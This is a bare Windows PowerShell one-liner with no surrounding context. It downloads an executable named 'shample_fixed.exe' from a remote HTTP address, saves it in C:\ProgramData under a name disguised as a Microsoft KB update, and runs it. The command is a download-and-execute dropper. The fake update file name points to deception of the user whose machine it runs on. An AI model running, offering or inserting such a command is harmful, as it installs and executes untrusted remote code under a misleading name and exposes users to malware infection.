powershell -command "(new-object system.net.webclient).downloadfile('http://0.0.0.0/shample/shample_fixed.exe','c:\programdata\microsoft-kb510661.exe');(new-object -com shell.application).shellexecute('c:\programdata\microsoft-kb510661.exe');"

